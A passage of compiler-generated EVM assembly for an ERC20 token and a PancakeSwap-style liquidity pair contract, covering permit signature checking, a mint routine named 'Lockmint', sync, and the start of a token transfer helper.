\"ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup1\n      sload\n      0x01\n      dup1\n      dup3\n      add\n      swap1\n      swap3\n      sstore\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      dup3\n      mload\n        /* \"ERC20.sol\":706:772  0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9 */\n      0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      dup2\n      dup7\n      add\n      mstore\n      dup1\n      dup5\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      swap6\n      dup14\n      and\n      0x60\n      dup7\n      add\n      mstore\n      0x80\n      dup6\n      add\n      dup13\n      swap1\n      mstore\n      0xa0\n      dup6\n      add\n      swap6\n      swap1\n      swap6\n      mstore\n      0xc0\n      dup1\n      dup6\n      add\n      dup12\n      swap1\n      mstore\n      dup2\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup7\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"ERC20.sol\":3901:4144  abi.encode(... */\n      0xe0\n      dup6\n      add\n      dup3\n      mstore\n        /* \"ERC20.sol\":3870:4162  keccak256(... */\n      dup1\n      mload\n      swap1\n      dup4\n      add\n      keccak256\n      shl(0xf0, 0x1901)\n        /* \"ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0100\n      dup7\n      add\n      mstore\n      0x0102\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      0x0122\n      dup1\n      dup6\n      add\n      swap7\n      swap1\n      swap7\n      mstore\n      dup1\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup6\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap7\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup7\n      mstore\n        /* \"ERC20.sol\":3774:4176  abi.encodePacked(... */\n      0x0142\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n        /* \"ERC20.sol\":3751:4186  keccak256(... */\n      dup7\n      mload\n      swap7\n      dup4\n      add\n      swap7\n      swap1\n      swap7\n      keccak256\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      swap6\n      dup4\n      swap1\n      mstore\n      0x0162\n      dup5\n      add\n      dup1\n      dup3\n      mstore\n      dup7\n      swap1\n      mstore\n      0xff\n      dup10\n      and\n      0x0182\n      dup6\n      add\n      mstore\n      0x01a2\n      dup5\n      add\n      dup9\n      swap1\n      mstore\n      0x01c2\n      dup5\n      add\n      dup8\n      swap1\n      mstore\n      mload\n        /* \"ERC20.sol\":3734:3748  bytes32 digest */\n      swap2\n      swap4\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      swap3\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      0x01e2\n      dup1\n      dup3\n      add\n      swap4\n      not(0x1f)\n      dup2\n      add\n      swap3\n      dup2\n      swap1\n      sub\n      swap1\n      swap2\n      add\n      swap1\n        /* \"ERC20.sol\":4073:4088  nonces[owner]++ */\n      dup6\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_281\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_281:\n      pop\n      pop\n        /* \"ERC20.sol\":4223:4249  ecrecover(digest, v, r, s) */\n      mload(add(not(0x1f), mload(0x40)))\n      swap2\n      pop\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4280:4310  recoveredAddress != address(0) */\n      dup2\n      and\n      iszero\n      dup1\n      iszero\n      swap1\n        /* \"ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n      tag_282\n      jumpi\n      pop\n        /* \"ERC20.sol\":4334:4339  owner */\n      dup9\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n        /* \"ERC20.sol\":4314:4330  recoveredAddress */\n      dup2\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"ERC20.sol\":4314:4339  recoveredAddress == owner */\n      and\n      eq\n        /* \"ERC20.sol\":4280:4339  recoveredAddress != address(0) && recoveredAddress == owner */\n    tag_282:\n        /* \"ERC20.sol\":4259:4391  require(... */\n      tag_283\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1a\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e56414c49445f5349474e4154555245000000000000\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_283:\n        /* \"ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      tag_284\n        /* \"ERC20.sol\":4410:4415  owner */\n      dup10\n        /* \"ERC20.sol\":4417:4424  spender */\n      dup10\n        /* \"ERC20.sol\":4426:4431  value */\n      dup10\n        /* \"ERC20.sol\":4401:4409  _approve */\n      tag_190\n        /* \"ERC20.sol\":4401:4432  _approve(owner, spender, value) */\n      jump\t// in\n    tag_284:\n        /* \"ERC20.sol\":3475:4439  function permit(... */\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"Pair.sol\":6635:7916  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_127:\n        /* \"Pair.sol\":6688:6702  uint liquidity */\n      0x00\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_286\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_286:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      dup2\n      swap1\n      sstore\n        /* \"Pair.sol\":1259:1260  0 */\n      dup1\n        /* \"Pair.sol\":6757:6770  getReserves() */\n      tag_288\n        /* \"Pair.sol\":6757:6768  getReserves */\n      tag_56\n        /* \"Pair.sol\":6757:6770  getReserves() */\n      jump\t// in\n    tag_288:\n      pop\n        /* \"Pair.sol\":6818:6824  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":6844:6848  this */\n      address\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":6714:6770  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      swap4\n      swap6\n      pop\n      swap2\n      swap4\n      pop\n        /* \"Pair.sol\":6795:6808  uint balance0 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":6818:6824  token0 */\n      swap1\n      swap2\n      and\n      swap2\n        /* \"Pair.sol\":6811:6835  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":6818:6824  token0 */\n      dup7\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_289\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_289:\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_290\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_290:\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_291\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_291:\n      pop\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":6883:6889  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":6909:6913  this */\n      address\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      swap3\n      swap4\n      pop\n        /* \"Pair.sol\":6860:6873  uint balance1 */\n      0x00\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":6883:6889  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"Pair.sol\":6876:6900  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":6811:6850  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":6883:6889  token1 */\n      dup7\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_292\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_292:\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_293\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_293:\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_294\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_294:\n      pop\n        /* \"Pair.sol\":6876:6915  IERC20(token1).balanceOf(address(this)) */\n      mload\n      swap1\n      pop\n        /* \"Pair.sol\":6925:6937  uint amount0 */\n      0x00\n        /* \"Pair.sol\":6940:6963  balance0.sub(_reserve0) */\n      tag_295\n        /* \"Pair.sol\":6940:6948  balance0 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6940:6963  balance0.sub(_reserve0) */\n      dup8\n      and\n      0xffffffff\n        /* \"Pair.sol\":6940:6952  balance0.sub */\n      tag_177\n        /* \"Pair.sol\":6940:6963  balance0.sub(_reserve0) */\n      and\n      jump\t// in\n    tag_295:\n        /* \"Pair.sol\":6925:6963  uint amount0 = balance0.sub(_reserve0) */\n      swap1\n      pop\n        /* \"Pair.sol\":6973:6985  uint amount1 */\n      0x00\n        /* \"Pair.sol\":6988:7011  balance1.sub(_reserve1) */\n      tag_296\n        /* \"Pair.sol\":6988:6996  balance1 */\n      dup4\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":6988:7011  balance1.sub(_reserve1) */\n      dup8\n      and\n      0xffffffff\n        /* \"Pair.sol\":6988:7000  balance1.sub */\n      tag_177\n        /* \"Pair.sol\":6988:7011  balance1.sub(_reserve1) */\n      and\n      jump\t// in\n    tag_296:\n        /* \"Pair.sol\":6973:7011  uint amount1 = balance1.sub(_reserve1) */\n      swap1\n      pop\n        /* \"Pair.sol\":7022:7032  bool feeOn */\n      0x00\n        /* \"Pair.sol\":7035:7065  _mintFee(_reserve0, _reserve1) */\n      tag_297\n        /* \"Pair.sol\":7044:7053  _reserve0 */\n      dup8\n        /* \"Pair.sol\":7055:7064  _reserve1 */\n      dup8\n        /* \"Pair.sol\":7035:7043  _mintFee */\n      tag_214\n        /* \"Pair.sol\":7035:7065  _mintFee(_reserve0, _reserve1) */\n      jump\t// in\n    tag_297:\n        /* \"Pair.sol\":7075:7092  uint _totalSupply */\n      0x00\n        /* \"Pair.sol\":7095:7106  totalSupply */\n      sload\n        /* \"Pair.sol\":7022:7065  bool feeOn = _mintFee(_reserve0, _reserve1) */\n      swap1\n      swap2\n      pop\n        /* \"Pair.sol\":7198:7215  _totalSupply == 0 */\n      dup1\n        /* \"Pair.sol\":7194:7593  if (_totalSupply == 0) {... */\n      tag_298\n      jumpi\n        /* \"Pair.sol\":7243:7297  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      tag_299\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":7243:7274  Math.sqrt(amount0.mul(amount1)) */\n      tag_176\n        /* \"Pair.sol\":7253:7273  amount0.mul(amount1) */\n      tag_218\n        /* \"Pair.sol\":7253:7260  amount0 */\n      dup8\n        /* \"Pair.sol\":7265:7272  amount1 */\n      dup8\n        /* \"Pair.sol\":7253:7273  amount0.mul(amount1) */\n      0xffffffff\n        /* \"Pair.sol\":7253:7264  amount0.mul */\n      tag_175\n        /* \"Pair.sol\":7253:7273  amount0.mul(amount1) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":7243:7297  Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n    tag_299:\n        /* \"Pair.sol\":7231:7297  liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY) */\n      swap9\n      pop\n        /* \"Pair.sol\":7311:7352  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      tag_302\n        /* \"Pair.sol\":7330:7331  0 */\n      0x00\n        /* \"Pair.sol\":443:450  10 ** 3 */\n      0x03e8\n        /* \"Pair.sol\":7311:7321  freezeMint */\n      tag_303\n        /* \"Pair.sol\":7311:7352  freezeMint(address(0), MINIMUM_LIQUIDITY) */\n      jump\t// in\n    tag_302:\n      pop\n        /* \"Pair.sol\":7194:7593  if (_totalSupply == 0) {... */\n      jump(tag_304)\n    tag_298:\n        /* \"Pair.sol\":7450:7582  Math.min(... */\n      tag_305\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"Pair.sol\":7476:7513  amount0.mul(_totalSupply) / _reserve0 */\n      dup10\n      and\n        /* \"Pair.sol\":7476:7501  amount0.mul(_totalSupply) */\n      tag_224\n        /* \"Pair.sol\":7476:7483  amount0 */\n      dup7\n        /* \"Pair.sol\":7488:7500  _totalSupply */\n      dup5\n        /* \"Pair.sol\":7476:7501  amount0.mul(_totalSupply) */\n      0xffffffff\n        /* \"Pair.sol\":7476:7487  amount0.mul */\n      tag_175\n        /* \"Pair.sol\":7476:7501  amount0.mul(_totalSupply) */\n      and\n      jump\t// in\n        /* \"Pair.sol\":7450:7582  Math.min(... */\n    tag_305:\n        /* \"Pair.sol\":7438:7582  liquidity = Math.min(... */\n      swap9\n      pop\n        /* \"Pair.sol\":7194:7593  if (_totalSupply == 0) {... */\n    tag_304:\n        /* \"Pair.sol\":7622:7623  0 */\n      0x00\n        /* \"Pair.sol\":7610:7619  liquidity */\n      dup10\n        /* \"Pair.sol\":7610:7623  liquidity > 0 */\n      gt\n        /* \"Pair.sol\":7602:7668  require(liquidity > 0, \"UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED\") */\n      tag_310\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x28\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_6591c9f5bf1fefaad109b76a20e25c857b696080c952191f86220f001a83663e\n      0x28\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_310:\n        /* \"Pair.sol\":7678:7703  freezeMint(to, liquidity) */\n      tag_311\n        /* \"Pair.sol\":7689:7691  to */\n      dup11\n        /* \"Pair.sol\":7693:7702  liquidity */\n      dup11\n        /* \"Pair.sol\":7678:7688  freezeMint */\n      tag_303\n        /* \"Pair.sol\":7678:7703  freezeMint(to, liquidity) */\n      jump\t// in\n    tag_311:\n      pop\n        /* \"Pair.sol\":7714:7763  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_231\n        /* \"Pair.sol\":7722:7730  balance0 */\n      dup7\n        /* \"Pair.sol\":7732:7740  balance1 */\n      dup7\n        /* \"Pair.sol\":7742:7751  _reserve0 */\n      dup11\n        /* \"Pair.sol\":7753:7762  _reserve1 */\n      dup11\n        /* \"Pair.sol\":7714:7721  _update */\n      tag_186\n        /* \"Pair.sol\":7714:7763  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n        /* \"ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_130:\n      0x02\n      0x20\n      swap1\n      dup2\n      mstore\n      0x00\n      swap3\n      dup4\n      mstore\n      0x40\n      dup1\n      dup5\n      keccak256\n      swap1\n      swap2\n      mstore\n      swap1\n      dup3\n      mstore\n      swap1\n      keccak256\n      sload\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":641:659  uint public taxfee */\n    tag_132:\n      sload(0x0a)\n      dup2\n      jump\t// out\n        /* \"Pair.sol\":18544:18758  function sync() external lock {... */\n    tag_134:\n        /* \"Pair.sol\":1205:1213  unlocked */\n      sload(0x10)\n        /* \"Pair.sol\":1217:1218  1 */\n      0x01\n        /* \"Pair.sol\":1205:1218  unlocked == 1 */\n      eq\n        /* \"Pair.sol\":1197:1238  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_316\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_316:\n        /* \"Pair.sol\":1259:1260  0 */\n      0x00\n        /* \"Pair.sol\":1248:1256  unlocked */\n      0x10\n        /* \"Pair.sol\":1248:1260  unlocked = 0 */\n      sstore\n        /* \"Pair.sol\":18612:18618  token0 */\n      sload(0x08)\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":18638:18642  this */\n      address\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"Pair.sol\":18584:18751  _update(... */\n      tag_318\n      swap3\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":18612:18618  token0 */\n      and\n      swap2\n        /* \"Pair.sol\":18605:18629  IERC20(token0).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":18612:18618  token0 */\n      dup7\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_319\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_319:\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_320\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_320:\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_321\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_321:\n      pop\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":18665:18671  token1 */\n      sload(0x09)\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"Pair.sol\":18691:18695  this */\n      address\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"Pair.sol\":18665:18671  token1 */\n      swap1\n      swap3\n      and\n      swap2\n        /* \"Pair.sol\":18658:18682  IERC20(token1).balanceOf */\n      0x70a08231\n      swap2\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"Pair.sol\":18605:18644  IERC20(token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"Pair.sol\":18665:18671  token1 */\n      dup7\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_322\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_322:\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_323\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_323:\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_324\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_324:\n      pop\n        /* \"Pair.sol\":18658:18697  IERC20(token1).balanceOf(address(this)) */\n      mload\n        /* \"Pair.sol\":18711:18719  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap2\n      shl(0x70, 0x01)\n        /* \"Pair.sol\":18733:18741  reserve1 */\n      swap1\n      div\n      and\n        /* \"Pair.sol\":18584:18591  _update */\n      tag_186\n        /* \"Pair.sol\":18584:18751  _update(... */\n      jump\t// in\n    tag_318:\n        /* \"Pair.sol\":1292:1293  1 */\n      0x01\n        /* \"Pair.sol\":1281:1289  unlocked */\n      0x10\n        /* \"Pair.sol\":1281:1293  unlocked = 1 */\n      sstore\n        /* \"Pair.sol\":18544:18758  function sync() external lock {... */\n      jump\t// out\n        /* \"Pair.sol\":1914:2252  function _safeTransfer(address token, address to, uint value) private {... */\n    tag_149:\n        /* \"Pair.sol\":516:550  bytes(\"transfer(address,uint256)\") */\n      0x40\n      dup1\n      mload\n      dup1\n      dup3\n      add\n      dup3\n      mstore\n      0x19\n      dup2\n      mstore\n      0x7472616e7366657228616464726573732c75696e743235362900000000000000\n      0x20\n      swap2\n      dup3\n      add\n      mstore\n        /* \"Pair.sol\":2054:2097  abi.encodeWithSelector(SELECTOR, to, value) */\n      dup2\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup6\n      dup2\n      and\n      0x24\n      dup4\n      add\n      mstore\n      0x44\n      dup1\n      dup4\n      add\n      dup7\n      swap1\n      mstore\n      dup5\n      mload\n        /* \"--CODEGEN--\":26:47   */\n      dup1\n      dup5\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      swap1\n      swap2\n      add\n        /* \"--CODEGEN--\":6:55   */\n      dup2\n      mstore\n        /* \"Pair.sol\":2054:2097  abi.encodeWithSelector(SELECTOR, to, value) */\n      